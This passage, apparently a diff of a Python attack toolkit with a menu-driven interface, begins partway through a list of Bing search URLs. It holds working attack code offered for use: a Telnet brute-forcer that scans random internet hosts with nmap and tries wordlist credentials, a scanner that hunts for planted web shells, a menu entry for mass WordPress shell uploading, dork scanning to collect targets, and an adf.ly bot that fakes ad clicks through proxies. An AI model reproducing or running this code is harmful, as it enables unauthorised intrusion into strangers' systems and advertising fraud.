=1","http://www.bing.ch/search?q=&count=50&first=51","http://www.bing.ch/search?q=&count=50&first=101","http://www.bing.com.tr/search?q=&count=50&first=1","http://www.bing.com.tr/search?q=&count=50&first=51","http://www.bing.com.tr/search?q=&count=50&first=101","http://www.bing.com.pr/search?q=&count=50&first=1","http://www.bing.com.pr/search?q=&count=50&first=51","http://www.bing.com.pr/search?q=&count=50&first=101","http://www.bing.com.ar/search?q=&count=50&first=1","http://www.bing.com.ar/search?q=&count=50&first=51","http://www.bing.com.ar/search?q=&count=50&first=101","http://www.bing.com.co/search?q=&count=50&first=1","http://www.bing.com.co/search?q=&count=50&first=51","http://www.bing.com.co/search?q=&count=50&first=101","http://www.bing.com.es/search?q=&count=50&first=1","http://www.bing.com.es/search?q=&count=50&first=51","http://www.bing.com.es/search?q=&count=50&first=101","http://www.bing.fi/search?q=&count=50&first=1","http://www.bing.fi/search?q=&count=50&first=51","http://www.bing.fi/search?q=&count=50&first=101","http://www.bing.bo/search?q=&count=50&first=1","http://www.bing.bo/search?q=&count=50&first=51","http://www.bing.bo/search?q=&count=50&first=101","http://www.bing.com.do/search?q=&count=50&first=1","http://www.bing.com.do/search?q=&count=50&first=51","http://www.bing.com.do/search?q=&count=50&first=101","http://www.bing.gr/search?q=&count=50&first=1","http://www.bing.gr/search?q=&count=50&first=51","http://www.bing.gr/search?q=&count=50&first=101","http://www.bing.com.hk/search?q=&count=50&first=1","http://www.bing.com.hk/search?q=&count=50&first=51","http://www.bing.com.hk/search?q=&count=50&first=101","http://www.bing.com.hr/search?q=&count=50&first=1","http://www.bing.com.hr/search?q=&count=50&first=51","http://www.bing.com.hr/search?q=&count=50&first=101","http://www.bing.com.mx/search?q=&count=50&first=1","http://www.bing.com.mx/search?q=&count=50&first=51","http://www.bing.com.mx/search?q=&count=50&first=101","http://www.bing.com.my/search?q=&count=50&first=1","http://www.bing.com.my/search?q=&count=50&first=51","http://www.bing.com.my/search?q=&count=50&first=101","http://www.bing.ph/search?q=&count=50&first=1","http://www.bing.ph/search?q=&count=50&first=51","http://www.bing.ph/search?q=&count=50&first=101","http://www.bing.com.pr/search?q=&count=50&first=1","http://www.bing.com.pr/search?q=&count=50&first=51","http://www.bing.com.pr/search?q=&count=50&first=101","http://www.bing.pt/search?q=&count=50&first=1","http://www.bing.pt/search?q=&count=50&first=51","http://www.bing.pt/search?q=&count=50&first=101","http://www.bing.com.ro/search?q=&count=50&first=1","http://www.bing.com.ro/search?q=&count=50&first=51","http://www.bing.com.ro/search?q=&count=50&first=101","http://www.bing.ru/search?q=&count=50&first=1","http://www.bing.ru/search?q=&count=50&first=51","http://www.bing.ru/search?q=&count=50&first=101","http://www.bing.com.sa/search?q=&count=50&first=1","http://www.bing.com.sa/search?q=&count=50&first=51","http://www.bing.com.sa/search?q=&count=50&first=101","http://www.bing.si/search?q=&count=50&first=1","http://www.bing.si/search?q=&count=50&first=51","http://www.bing.si/search?q=&count=50&first=101","http://www.bing.sk/search?q=&count=50&first=1","http://www.bing.sk/search?q=&count=50&first=51","http://www.bing.sk/search?q=&count=50&first=101","http://www.bing.com.ua/search?q=&count=50&first=1","http://www.bing.com.ua/search?q=&count=50&first=51","http://www.bing.com.ua/search?q=&count=50&first=101","http://www.bing.com.uy/search?q=&count=50&first=1","http://www.bing.com.uy/search?q=&count=50&first=51","http://www.bing.com.uy/search?q=&count=50&first=101","http://www.bing.vn/search?q=&count=50&first=1","http://www.bing.vn/search?q=&count=50&first=51","http://www.bing.vn/search?q=&count=50&first=101"}
     def dorkscan(dork):
         for bing in binglist:
             bingg = bing.replace("&count",dork + "&count")
@@ -1436,10 +1092,8 @@ def dork_scan():
                         with open("sitelist.txt","a") as f:
                             if "http" in site:f.write(site + "/" + "\n")
                             else:f.write("http://" + site + "/" + "\n")
-                    except:
-                        pass
-            except:
-                pass
+                    except:pass
+            except:pass
     clear()
     banner_ms()
     dorklist = input(" [*] Dorklist : ")
@@ -1449,17 +1103,11 @@ def dork_scan():
         print(" %s[+] Scan started! Please wait... :)"%fb)
         pp = Pool(10)
         pr = pp.map(dorkscan,dorks)
-    except:
-        print(" %s[+] Dorklist not found!"%fr)
-
+    except:print(" %s[+] Dorklist not found!"%fr)
 def Folder(directory):
-    if not os.path.exists(directory):
-        os.makedirs(directory)
+    if not os.path.exists(directory):os.makedirs(directory)
 Folder("result")
-Bad = 0
-Good = 0
-pro = 0
-email = "drag@animcra.tech"
+Bad, Good, pro, email = 0, 0, 0, "malamcoder@gmail.com"
 def shell(i) :
     global Bad,Good,pro
     try :
@@ -1499,22 +1147,172 @@ def shell(i) :
                         print(fc+"[ + ] "+fr+"Not found >>> "+i+"  By script Shell"+xox)
                         pass
                     break
-    except :
-        pass
-    if os.name == 'nt':
-        ctypes.windll.kernel32.SetConsoleTitleW(' [+] Finder |Shell- {} |Not-found- {} |Proxy-changed- {}'.format(Good, Bad,pro))
-    else :
-        sys.stdout.write(' [+] Finder |Shell- {} |Not Found- {}| Proxy-changed-{}\x07'.format(Good,Bad,pro))
+    except:pass
+    if os.name == 'nt':ctypes.windll.kernel32.SetConsoleTitleW(' [+] Finder |Shell- {} |Not-found- {} |Proxy-changed- {}'.format(Good, Bad,pro))
+    else:sys.stdout.write(' [+] Finder |Shell- {} |Not Found- {}| Proxy-changed-{}\x07'.format(Good,Bad,pro))
+def phishing(): # v Private
+    try:
+        print('%s Phishing'%MAIN_LIST('01'))
+        print('%s IP Track'%MAIN_LIST('02'))
+        c = int(input_drg(promt_choice))
+        while True:
+            if (c == 1):pass
+            elif (c == 2):pass
+            else:pass
+    except:pass
+def adf_clicker(url, path):
+    with open(path) as f:
+        content = f.readlines()
+        f.close()
+    proxies = 0
+    with open(path) as infp:
+        for line in infp:
+            if line.strip(): proxies += 1
+    print(fb+'[*] Loaded %d proxies' %proxies)
+    run_through = 1
+    while True:
+        print("Ran %s times" %run_through)
+        try: use_proxy = content[run_through]
+        except IndexError:
+            print(fr+"[-] Out of proxies")
+            break
+        print(fg+"[+] Using: %s" %use_proxy)
+        chrome_options = webdriver.ChromeOptions()
+        chrome_options.add_argument('--proxy-server=%s' %use_proxy)
+        browser = webdriver.Chrome(chrome_options=chrome_options)
+        try:
+           browser.get(url)
+           sleep(2)
+           browser.find_element_by_id('skip_button').click()
+           sleep(2)
+           browser.quit()
+        except Exception as e:
+            print(fr+"[-] Skipping proxy. Error occured")
+            browser.quit()
+            run_through += 1
+            continue
+        run_through += 1
+        if run_through >= proxies:
+            print(fr+"[-] No more proxies")
+            break
+
+    print(fg+'[+] Done!')
+def code_finder(your_dir, code, option):
+    def Walk(root, recurse=0, pattern='*', return_folders=0):
+        result = []
+        try: names = os.listdir(root)
+        except os.error: return result
+        pattern = pattern or '*'
+        pat_list = string.splitfields(pattern , ';')
+        for name in names:
+            fullname = os.path.normpath(os.path.join(root, name))
+            for pat in pat_list:
+                if fnmatch.fnmatch(name, pat):
+                    if os.path.isfile(fullname) or (return_folders and os.path.isdir(fullname)): result.append(fullname)
+                    continue
+            if recurse:
+                if os.path.isdir(fullname) and not os.path.islink(fullname): result = result + Walk(fullname, recurse, pattern, return_folders)
+        return result
+    def search(files):
+        print("\n[+] Searching:",len(files),"files")
+        for file in files:
+            num = 0
+            try:
+                text = open(file, "r").readlines()
+                for line in text:
+                    num +=1
+                    if re.search(sys.argv[2].lower(), line.lower()):
+                        print("\n [!] File: ",file,"\tLine: ",num)
+                        print(" [!] ",line)
+            except(IOError): pass
+        print("\n [-] Done\n")
+    print("--------------------------------------------")
+    print("\n [+] Scanning: ", your_dir)
+    print(" [+] Code: ", code)
+    files = Walk(your_dir, 1, '*', 1)
+    search(files)
+def TelnetBruteForce(many, userlist, wordlist):
+
+    try: users = open(userlist, "r").readlines()
+    except(IOError):
+        print(f"{fr}[!] Error: Check your userlist path\n")
+        sys.exit(1)
+
+    try: words = open(wordlist, "r").readlines()
+    except(IOError):
+        print(f"{fr}[!] Error: Check your wordlist path\n")
+        sys.exit(1)
+
+    print("\t--------------------------------------------------\n")
+    print("[+] Scanning: ", many," hosts")
+    print("[+] Users Loaded: ",len(users))
+    print("[+] Words Loaded: ",len(words),"\n")
+    wordlist = copy(words)
+
+    def scan():
+        nmap = io.StringIO(subprocess.getstatusoutput('nmap -P0 -iR 1 -p 23 | grep open -B 3')[1]).readlines()
+        for tmp in nmap:
+            ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
+            if ipaddr: return ipaddr
+
+    def getword():
+        lock = threading.Lock()
+        lock.acquire()
+        if len(words) != 0:
+            value = random.sample(words,  1)
+            words.remove(value[0])
+        else:
+            print("[*] Reloading Wordlist\n")
+            for word in wordlist: words.append(word)
+            value = random.sample(words,  1)
+        lock.release()
+        return value[0][:-1]
+
+    class Workhorse(threading.Thread):
+        def run(self):
+            value = getword()
+            try:
+                print("-"*12)
+                print("[+] User: ",user[:-1]," | Password: ",value)
+                tn = telnetlib.Telnet(ipaddr[0])
+                tn.read_until("login: ")
+                tn.write(user[:-1] + "\n")
+                if password:
+                    tn.read_until("Password: ")
+                    tn.write(value + "\n")
+                tn.write("ls\n")
+                tn.write("exit\n")
+                print(tn.read_all())
+                print("\n [+] Login successful: ",user[:-1], value)
+                tn.close()
+                work.join()
+                sys.exit(2)
+            except:pass
+
+    for x in range(int(many)):
+        print("[+] Scanning: ", x," of ", many)
+        ipaddr = scan()
+        if ipaddr != None:
+            print("\n[=] Attempting BruteForce: ",ipaddr[0],"\n")
+            for user in users:
+                for i in range(len(words)):
+                    if i == 0:
+                        for word in wordlist:
+                            words.append(word)
+                    work = Workhorse()
+                    work.start()
+                    time.sleep(2)
+def FtpBrute(HOST, Option, UserList, PassList): # Added in next version!
+    pass
+
 
 if __name__ == '__main__':
     CHECK_INTERNET()
     if Internet == 'Online':pass
     else:
-        ctn = input_drg(' [!] No have internet! May some tools will not working!\n [*] Want to continue? %s[Y/n]'%fm)
-        if ctn == 'Y' or ctn == 'y':pass 
-        else:
-            clear()
-            sys.exit('[!] Exit!')
+        ctn = input_drg(f' [!] No have internet! May some tools will not working!\n [*] Want to continue? {fm}[Y/n]')
+        if ctn == 'Y' or ctn == 'y':pass
+        else:clear(), sys.exit('[!] Exit!')
     try:
         clear()
         banner_drgn()
@@ -1522,6 +1320,10 @@ if __name__ == '__main__':
         print(' %s Network Tools'%MAIN_LIST('02'))
         print(' %s Multi Tools'%MAIN_LIST('03'))
         print(' %s Pentest Tools'%MAIN_LIST('04'))
+        print(' %s Adf.ly Clicker'%MAIN_LIST('05'))
+        print(' %s Code Finder'%MAIN_LIST('06'))
+        print(' %s Telnet Brute Force'%MAIN_LIST('07'))
+        print(' %s Game'%MAIN_LIST('99'))
         print(' %s About US and Update LOGS\n'''%MAIN_LIST('00'))
         try:
             x = int(input_drg(promt_choice))
@@ -1530,57 +1332,90 @@ if __name__ == '__main__':
             elif (x == 3):some_tools()
             elif (x == 4):
                 clear()
-                print('''%s
-   ____                              __  __ ____  
-  |  _ \ _ __ __ _  __ _  ___  _ __ |  \/  / ___| 
-  | | | | '__/ _` |/ _` |/ _ \| '_ \| |\/| \___ \ 
-  | |_| | | | (_| | (_| | (_) | | | | |  | |___) |
-  |____/|_|  \__,_|\__, |\___/|_| |_|_|  |_|____/ 
-                   |___/                          
-                   '''%fg)
-                #print(' %s 3-5 Will added in v0.6!\n'%sb)
-                print(' %s Website CLoning'%MAIN_LIST('01'))
-                print(' %s Mass WP Shell UPloader'%MAIN_LIST('02'))
-                print(' %s Shell Finder'%MAIN_LIST('03'))
-                print(' %s Google Scanner('%MAIN_LIST('04'))
-                print(' %s Google Scrapper\n'%MAIN_LIST('05'))
-                print(' %s Dork maker\n'%MAIN_LIST('06'))
-                print(' %s Dork scanner\n'%MAIN_LIST('07'))
+                banner_lst('PENTESTING')
                 try:
-                    c = int(input_drg(promt_choice))
-                except:
-                    print('\n %sChoose from 1-5, please.\n'%fr)
-                print('')
-                if (c == 1):
-                    website = input_drg(' [+] Ex: https://github.com/\n [+] Url: ')
-                    if website[0] + website[1] + website[2] + website[3] == 'http':
-                        res = website.replace('http://', '').replace('www.', '').strip('/')
-                    os.system('wget -rk '+website)
+                    print(' %s Website CLoning'%MAIN_LIST('01'))
+                    print(' %s Mass WP Shell UPloader'%MAIN_LIST('02'))
+                    print(' %s Shell Finder'%MAIN_LIST('03'))
+                    print(' %s Google Scanner'%MAIN_LIST('04'))
+                    print(' %s Google Scrapper'%MAIN_LIST('05'))
+                    print(' %s Dork maker'%MAIN_LIST('06'))
+                    print(' %s Dork scanner'%MAIN_LIST('07'))
+                    #print(' %s FTP Brute'%MAIN_LIST('08'))
+                    try:c = int(input_drg(promt_choice))
+                    except:print('\n %sChoose from 1-5, please.\n'%fr), print('')
+                    if (c == 1):
+                        website = input_drg(' [+] Ex: https://github.com/\n [+] Url: ')
+                        if website[0] + website[1] + website[2] + website[3] == 'http':res = website.replace('http://', '').replace('www.', '').strip('/')
+                        os.system('wget -rk '+website), clear(), print(fg+' [+] File saved at '+res)
+                    if (c == 2):wpup_shell()
+                    if (c == 3):
+                        file_name = input_drg(" [+] Url List: ")
+                        op = open(file_name,'r').read().splitlines()
+                        TEXTList = [list.strip() for list in op]
+                        p = Pool(50)
+                        p.map(shell, TEXTList)
+                    if (c == 4):googleScanner()
+                    if (c == 5):
+                        dork_s = input_drg(' [+] Dork: ')
+                        if ['', ' '] in dork_s:print(fr+' [!] Please put your Dork!')
+                        else:googleScraper(dork_s)
+                    if (c == 6):dork_maker()
+                    if (c == 7):dork_scan()
+                    if (c == 8):pass
+                except KeyboardInterrupt:sys.exit(Aborted)
+            elif (x == 5):
+                while True:
                     clear()
-                    print(' [+] File saved at '+res)
-                if c == 2:wpup_shell()
-                if c == 3:
-                    file_name = input(" [+] Url List: ")
-                    op = open(file_name,'r').read().splitlines()
-                    TEXTList = [list.strip() for list in op]
-                    p = Pool(50)
-                    p.map(shell, TEXTList)
-                if c == 4:googleScanner()
-                if c == 5:
-                    dork_s = input_drg(' [+] Dork: ')
-                    if ['', ' '] in dork_s:print(' [!] Please put your Dork!')
-                    else:googleScraper(dork_s)
-                if c == 6:dork_maker()
-                if c == 7:dork_scan()
-                
-            elif (x == 0):
+                    banner_lst('ADF.LY BOT')
+                    print('----------------------------\n')
+                    try:
+                        url, proxy_path = input(" [+] Url (With http://): "), input(" [+] Your proxy file:")
+                        if url == '':print('\n {0}{1}[-] Target not found!'.format(sb,fr)), time.sleep(2.3)
+                        else:adf_clicker(url, proxy_path)
+                    except FileNotFoundError:print('\n {0}{1}[-] Proxy file not found!'.format(sb,fr)), time.sleep(2.3)
+            elif (x == 6):
                 clear()
-                about_me()
-            else:
-                sys.exit(NFound)
-        except ValueError:
-            sys.exit(NFound)
-        except KeyboardInterrupt:
-            sys.exit(Aborted)
-    except KeyboardInterrupt:
-        sys.exit(Aborted)
+                banner_lst('CODE FINDER')
+                print('\n----------------------------\n')
+                try:
+                    name_dir = input_drg(f'\n{sb} [+] Dir: ')
+                    code = input_drg(f'{sb} [*] Code: ')
+                    option = input_drg(f'{sb} [-] Option: ')
+                    if name_dir == '' or code == '' or option == '':
+                        sys.exit(f'\n{fr} Error.')
+                except KeyboardInterrupt:
+                    sys.exit(Aborted)
+                clear()
+                code_finder(name_dir, code, option)
+            elif (x == 7):
+                clear()
+                banner_lst('TELNET BRUTE FORCE')
+                try:
+                    print('\n----------------------------\n')
+                    Amount = input_drg('[+] How many to scan: ')
+                    Userlist = input_drg('[+] User list path: ')
+                    Wordlist = input_drg('[+] Word list path: ')
+                    if Amount == '' or Userlist == '' or Wordlist == '': sys.exit(f'{fr} Error.')
+                    else:
+                        clear()
+                        TelnetBruteForce(Amount, Userlist, Wordlist)
+                except KeyboardInterrupt:
+                    sys.exit(Aborted)
+            elif (x == 8):pass
+            elif (x == 99):
+                try:
+                    clear()
+                    banner_lst('GAME')
+                    print(' %s SnakeGame(Only For PC/LINUX)'%MAIN_LIST('01'))
+                    GameChoice = int(input_drg(promt_choice))
+                    if GameChoice==1:
+                        os.system('python3 GAME/SnakeGame.py')
+                except KeyboardInterrupt:
+                    print(Aborted)
+                    sys.exit(1)
+            elif (x == 0):clear(), about_me()
+            else:sys.exit(NFound)
+        except ValueError:sys.exit(NFound)
+        except KeyboardInterrupt:sys.exit(Aborted)
+    except KeyboardInterrupt:sys.exit(Aborted)
